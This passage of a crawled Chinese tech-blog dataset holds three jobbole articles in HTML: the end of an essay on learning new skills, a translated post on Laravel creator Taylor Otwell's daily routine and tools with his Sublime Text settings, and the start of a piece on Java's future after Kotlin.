href=\"https://www.cs.ubc.ca/~murphyk/MLbook/\">MLAPP</a>，整本书都是印刷错误，习题无解答，全靠个人感觉，虽说是本好书，但阅读过程中我不停地做一些人工勘误的工作，非常痛苦，不适合入门阅读。</p>\n<p>最后，很重要的一点，这个资料是否适合你当前的知识水平。太简单，以至于整本书都在印证你的想法，让你觉得它”很好读”；太难，你无法通过直觉跳过某些推导步骤，每一页的阅读都需要大量的思考，哪怕看完一整章，你也没有对这个章节的完整图景。</p>\n<p>合适的难度，就是让你兴奋的难度，你能从中找到你过往的一些经验，也能看到很多全新的方法和观念，学完一章后，是否有一些愉快的想象，如果有，那么它的难度刚刚好。</p>\n<h3 id=\"toc_2\">短期专注</h3>\n<p>找到资料后，不要浪费它。快速，完整地把它消化掉，不要中断，每天至少两个小时以上的专注，周末也不要停，这是我的方法。</p>\n<p>有些朋友喜欢同时做几件重要的事，然后在事情之间做时间片轮转，先做做A，再做做B，这种方式有助于应对给领导长辈跑腿之类的琐事，但对学习来说效率较低。</p>\n<p>在短时间内全身心沉入到单一的问题中，在这段时间里，连潜意识都在帮你工作，你不仅在记忆知识点，更是在构建对这个领域的基本直觉。混合多种学习方式也很重要，不仅有被动的听和阅读，也有主动的实验，试错，推导。前文所说的资料准备，正是为了服务这个近乎宗教仪式的过程，如果选不对资料，你就没法找到这条灵性之路。</p>\n<h3 id=\"toc_3\">自然遗忘</h3>\n<p>人类会遗忘，这件事情曾让我很难过。</p>\n<p>半年不接触一门手艺，就会生疏，再过半年，完全遗忘。我想把所有的理论，公式，语言，框架都记住，一有生疏，我就复习，就像抱着满满一筐苹果，一路丢，一路捡。心里疲惫，身体劳累，甚至觉得，如果最终都会遗忘，那一开始为什么要学。</p>\n<p>后来才想明白，苹果框满了，我们就倒掉，再来一筐梨，桃子，火龙果，葡萄。对于学习新知识的方法论，逐年在磨练精进，虽然知识点没法记住，但对于该领域的直觉已经建立。</p>\n<p>现在我把学习新知识，当时一次次旅行，其中的滋味，留给大家各自体会。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111240\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111240votetotal\">3</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111240\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 10 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 3 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2014/01/4deb4f92b1ab6bb2fe2812959af42fe3.jpg"], "fav_nums": 10, "comment_nums": 3, "create_date": "2017/06/08", "praise_nums": 3}
{"tags": "Laravel,php,Taylor Otwell,开发,PHP", "front_image_path": "full/340eb88c57cd5078bbd9b3e690fc9c7c0db8c954.jpg", "title": "PHP 框架 Laravel 作者的工作日常", "url_object_id": "c56b65bb86017ea72f5fdb179309ac0f", "url": "http://blog.jobbole.com/111432/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/TJQ\">佟大冬</a> 翻译，<a href=\"http://www.jobbole.com/members/huanglimin\">黄利民</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://medium.com/@taylorotwell/how-i-work-a22010d1ad82#.fbjc5ckar\">Taylor Otwell</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>【导读】：PHP Web 框架 Laravel 作者 Taylor Otwell 介绍自己的工作日常，办公配置，开发工具等等。</p>\n<p><img class=\"aligncenter\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fgiinzj7mej20go08cjrv.jpg\" width=\"600\" height=\"300\"></p>\n<p>经常有人问我有关日常工作的问题，例如我是如何管理时间的，我常用的工具有哪些，我喜欢用什么编辑器和配色方案。在这里，我将借这篇文章尝试回答这些问题。</p>\n<h3>普通的一天</h3>\n<p>我在家办公，全职从事 Laravel 的工作。通常早八点之前就到办公室了，第一件事就是回复昨晚收到的所有来自 Forge、Envoyer 和 Spark 的客户邮件，大约 15 封。回复邮件时，在电脑上用 Apple Mail，在手机上用Outlook。我喜欢清空收件箱之后再继续忙其他事情。接下来一整天，我还会定期查看邮件，确保收件箱干净明了。</p>\n<p>回复完邮件，我就会查看 Laravel 的 GitHub 仓库（repository）中优秀的 pull 请求，我尽量让此类请求不超过 10-12 个。 通常我会在九点之前将所有的邮件和 pull request 处理完，当然其间 Mohamed 会帮我审查并分类 GitHub 上的问题及 pull request。</p>\n<p>在合并或关闭了昨晚出现的 pull 请求之后，我便可以去做任何我想做的项目了，当然一般是和 Laravel 相关的。最近我主要在忙 Horizon，一个新开发的 Laravel 包，我希望在 Laracon US 会上多谈谈。</p>\n<p>下午五点全天工作结束，之后我会和家人一起吃晚饭然后闲逛。晚上九点半左右，我会再次查看邮箱，处理下午五点之后收到的邮件，这通常只需要 10-15 分钟。这样可以减轻我明天早上处理邮件的工作量。</p>\n<p><img class=\"alignnone aligncenter\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fgiio11zmoj20zk0k00tp.jpg\" width=\"690\" height=\"388\"></p>\n<p style=\"text-align: center;\"><em>（这是之前 Laravel Sydney 活动，Taylor Otwell 远程互动）</em></p>\n<h3>开发配置</h3>\n<p>我用来开发的机器主要是一台5k 屏 iMac，处理器 4 Ghz、RAM 16 GB。iMac 两边各放一台 24 寸 4k 显示器。我把两边的显示器背景调为深灰色，这样当我没在用时，它们看起来像是关闭的，不会很刺眼。</p>\n<p><img id=\"pic\" class=\"aligncenter\" src=\"http://wx1.sinaimg.cn/large/7cc829d3gy1fgiinxspohj20m80goq4s.jpg\"></p>\n<p>我有一把 Steelcase Leap 座椅，一个 Swell 水瓶和一个 Fidget Cube（减压魔方）。天花板上的飞利浦 Hue 照亮整个办公室。</p>\n<h2>开发工具</h2>\n<p><strong>编辑器</strong></p>\n<p>我常用的文本编辑器是 Sublime Text 3，主题为 Soda，配色方案为 Inspired GitHub。写代码主要用 Operator Mono 字体，用 SublimeLinter 检查 PHP 语法。</p>\n<p>整体配置像这样：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bbac8e8ab7589359270\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n{\r\n    \"added_words\":\r\n    [\r\n        \"Laravel\"\r\n    ],\r\n    \"caret_style\": \"phase\",\r\n    \"color_scheme\": \"Packages/User/SublimeLinter/One Dark (SL).tmTheme\",\r\n    \"ensure_newline_at_eof_on_save\": true,\r\n    \"findreplace_small\": true,\r\n    \"font_face\": \"OperatorMono-Book\",\r\n    \"font_size\": 15,\r\n    \"highlight_line\": false,\r\n    \"hot_exit\": false,\r\n    \"ignored_packages\":\r\n    [\r\n        \"SublimeLinter-jshint\",\r\n        \"Vintage\"\r\n    ],\r\n    \"line_numbers\": true,\r\n    \"line_padding_bottom\": 9,\r\n    \"line_padding_top\": 9,\r\n    \"phpunit-sublime-terminal\": \"iTerm\",\r\n    \"remember_open_files\": false,\r\n    \"show_definitions\": false,\r\n    \"show_panel_on_build\": false,\r\n    \"tab_size\": 4,\r\n    \"tabs_small\": false,\r\n    \"theme\": \"Soda Dark.sublime-theme\",\r\n    \"translate_tabs_to_spaces\": true,\r\n    \"trim_trailing_white_space_on_save\": true,\r\n    \"word_wrap\": false\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bbac8e8ab7589359270-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbac8e8ab7589359270-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bbac8e8ab7589359270-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbac8e8ab7589359270-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bbac8e8ab7589359270-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbac8e8ab7589359270-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bbac8e8ab7589359270-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbac8e8ab7589359270-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bbac8e8ab7589359270-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbac8e8ab7589359270-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bbac8e8ab7589359270-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbac8e8ab7589359270-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bbac8e8ab7589359270-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbac8e8ab7589359270-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594bbac8e8ab7589359270-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbac8e8ab7589359270-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-594bbac8e8ab7589359270-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbac8e8ab7589359270-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-594bbac8e8ab7589359270-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbac8e8ab7589359270-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-594bbac8e8ab7589359270-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbac8e8ab7589359270-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-594bbac8e8ab7589359270-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbac8e8ab7589359270-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-594bbac8e8ab7589359270-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbac8e8ab7589359270-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-594bbac8e8ab7589359270-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbac8e8ab7589359270-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-594bbac8e8ab7589359270-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbac8e8ab7589359270-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-594bbac8e8ab7589359270-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbac8e8ab7589359270-32\">32</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bbac8e8ab7589359270-1\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbac8e8ab7589359270-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"added_words\"</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-594bbac8e8ab7589359270-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">[</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbac8e8ab7589359270-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-s\">\"Laravel\"</span></div><div class=\"crayon-line\" id=\"crayon-594bbac8e8ab7589359270-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbac8e8ab7589359270-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"caret_style\"</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"phase\"</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-594bbac8e8ab7589359270-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"color_scheme\"</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Packages/User/SublimeLinter/One Dark (SL).tmTheme\"</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbac8e8ab7589359270-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"ensure_newline_at_eof_on_save\"</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-594bbac8e8ab7589359270-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"findreplace_small\"</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbac8e8ab7589359270-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"font_face\"</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"OperatorMono-Book\"</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-594bbac8e8ab7589359270-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"font_size\"</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbac8e8ab7589359270-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"highlight_line\"</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-594bbac8e8ab7589359270-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"hot_exit\"</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbac8e8ab7589359270-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"ignored_packages\"</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-594bbac8e8ab7589359270-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">[</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbac8e8ab7589359270-16\"><span class=\"crayon-h\">        </span><span class=\"crayon-s\">\"SublimeLinter-jshint\"</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-594bbac8e8ab7589359270-17\"><span class=\"crayon-h\">        </span><span class=\"crayon-s\">\"Vintage\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbac8e8ab7589359270-18\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-594bbac8e8ab7589359270-19\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"line_numbers\"</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbac8e8ab7589359270-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"line_padding_bottom\"</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-594bbac8e8ab7589359270-21\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"line_padding_top\"</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbac8e8ab7589359270-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"phpunit-sublime-terminal\"</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"iTerm\"</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-594bbac8e8ab7589359270-23\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"remember_open_files\"</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbac8e8ab7589359270-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"show_definitions\"</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-594bbac8e8ab7589359270-25\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"show_panel_on_build\"</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbac8e8ab7589359270-26\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"tab_size\"</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-594bbac8e8ab7589359270-27\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"tabs_small\"</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbac8e8ab7589359270-28\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"theme\"</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Soda Dark.sublime-theme\"</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-594bbac8e8ab7589359270-29\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"translate_tabs_to_spaces\"</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbac8e8ab7589359270-30\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"trim_trailing_white_space_on_save\"</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-594bbac8e8ab7589359270-31\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"word_wrap\"</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbac8e8ab7589359270-32\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0032 seconds] -->\r\n<p>在开发时，我通常会将 Subline 字体大小调到 10 左右。</p>\n<p><strong>终端</strong></p>\n<p>终端我用 iTerm2 和 Oh My Zsh，Oh My Zsh 采用内置主题 robbyrussell，iTerm2 的配色方案为 Arthur。我喜欢将 iTerm2 的行间距调宽一点，这样代码看起来不会太拥挤。像 Sbulime 一样，终端字体我用 Operator Mono。</p>\n<p><img class=\"aligncenter\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fgiinz6xuoj20m809ht9s.jpg\" width=\"690\" height=\"294\"></p>\n<p><strong>数据库</strong></p>\n<p>我用 Sequel Pro 与 MySQL 数据库进行交互，用 Medis 与 Redis 进行交互。我乐意为 Sequel Pro 支付数百美元，然而事实上它是免费的，真是令人惊讶。</p>\n<p><strong>SaaS 服务</strong></p>\n<p>我用各种服务运行 Forge 和 Envoyer。</p>\n<ul>\n<li>DigitalOcean 作为服务器</li>\n<li>需要多个服务器就用 Linode</li>\n<li>Cloudflare 作为 DNS 和 SSL</li>\n<li>Ottomatik 用于数据库备份</li>\n<li>AWS 用于存储和消息队列服务</li>\n<li>Pusher 用于处理实时消息</li>\n<li>Authy 用于双重认证</li>\n</ul>\n<p><strong>效率</strong></p>\n<p>我主要用 Bear、Wunderlist（奇妙清单）和 Trello 来记录，让一切井然有序。Bear 替代了 Apple Notes，用来记长篇笔记。Wunderlist 主要用来记录个人清单和业余项目清单。Trello 用于追踪记录与 Laravel 相关的事，比如即将推出的新特性或做出的重要修改。</p>\n<p>我还构建了一个小型 Laravel 应用程序，用来在 Telegram 上给我发送提醒，比如倒垃圾、更换家里的空气过滤器、每月缴税等等。这个小程序通过调用 Telegram API，用 Laravel 的命令调度功能和 Guzzle 库实现消息的发送。</p>\n<p><strong>音乐</strong></p>\n<p>我用 Spotify 听音乐，几个我最喜欢的播放列表是 Night Rider、Lush + Atmospheric 和 RetroWave / Outrun。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111432\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111432votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111432\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/TJQ\">佟大冬</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/TJQ\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/5f8b3a74725397a8f5033c9ac0afeefb.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            live and learn.        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/TJQ\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/tjq/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/TJQ/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 11</a> · <a title=\"QQ：601591123\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx1.sinaimg.cn/large/7cc829d3gy1fgiinxspohj20m80goq4s.jpg"], "fav_nums": 3, "comment_nums": 0, "create_date": "2017/06/12", "praise_nums": 1}
{"tags": "Kotlin,java,开发", "front_image_path": "full/70a26ac7d36e9a80368f97ef3948b78809073482.jpg", "title": "Kotlin 喧嚣过后，谈谈 Java 程序员未来的出路", "url_object_id": "d4a2fdd98b0b6d69ba106ca0e7528785", "url": "http://blog.jobbole.com/111422/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://mp.weixin.qq.com/s/NIn2hOUZDAq4sdA4TsSNYg\">世相微语</a>   </div><p><a href=\"http://blog.jobbole.com/111024/\" target=\"_blank\">自从谷歌 I/O 2017宣布将支持 Kotlin 作为 Android 开发的 First-Class 语言</a>，各种 Kotlin 能否取代 Java 的文章、争论层出不穷。 作为一名老 Java 程序员，虽然类似场面见过不少，但心态是比较复杂的。</p>\n<p>早在 2009 年，就有了 Scala 是否是 Java 后继者的争论。2009年7月 InfoQ 发表的一篇文章：「Roundup: Scala as the long term replacement for Java」，还谈到了 Java 之父 James Gosling 也偏爱 Scala 。（参考下图）</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/06/077c6c331d941ed20a062ac2efd822d2.png\"></p>\n<p>尽管 Scala 在业界的口碑不错，还受到不少自命极客的程序猿的拥趸。在 Java 程序员当中，也掀起了一阵学习 Scala 的风潮。但时至今日，取代 Java，还远远谈不上。</p>\n<p>Java 从诞生到现在，已有22年的历史。Java 在业界的霸主地位，虽然这些年一直受到 C/C++ 、Node.js 、GO 、Python 等语言的挑战，但一直稳如泰山。在众多领域的普及率、Java 不是榜首，也是名列前茅。下图是 2017年5月 最新的 TIOBE 编程语言排行榜</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/06/18c7a545e04c4d27f284116a3ae94702.png\"></p>\n<p>Java 依然是遥遥领先，不过相比较去年同期，Java 下降了 6.32% 。Java 的普及率从 2016年年初以来一直呈下降趋势，Java 程序员的未来之路该如何走，还是值得思考一下。</p>\n<p><strong>懂得居安思危、未雨绸缪，未来的运气才不会太差。</strong></p>\n<h2><strong>Java 生态圈</strong></h2>\n<p>Java 的生态环境开放、自由，在Sun/Oracle、Google、Apache、Eclipse基金会等各大厂商，还有技术大牛的共同努力下，Java 的生态圈异常繁荣，各种优秀的开源框架层出不穷。</p>\n<p><strong>Spring Boot</strong></p>\n<p>Spring Boot 是 Pivotal 团队推出的一个支持快速开发的框架，伴随 Spring4.0 而生，继承了 Spring 的优秀特质，简化了使用 Spring 编码、配置、部署的过程，使项目的开发变得简单、敏捷。</p>\n<p><strong>Spring Cloud</strong></p>\n<p>Spring Cloud 是基于 Spring Boot 的一整套分布式系统下的微服务构建框架，包含了众多的子项目，如 Spring Cloud Config 、Spring Cloud Stream 等。</p>\n<p>具体可参考：<a href=\"http://projects.spring.io/spring-cloud/\">http://projects.spring.io/spring-cloud/</a></p>\n<p><strong>Hadoop/Spark</strong></p>\n<p>Hadoop 是首个获得极大应用的大数据框架，是大数据领域标志性的解决方案。</p>\n<p>Spark 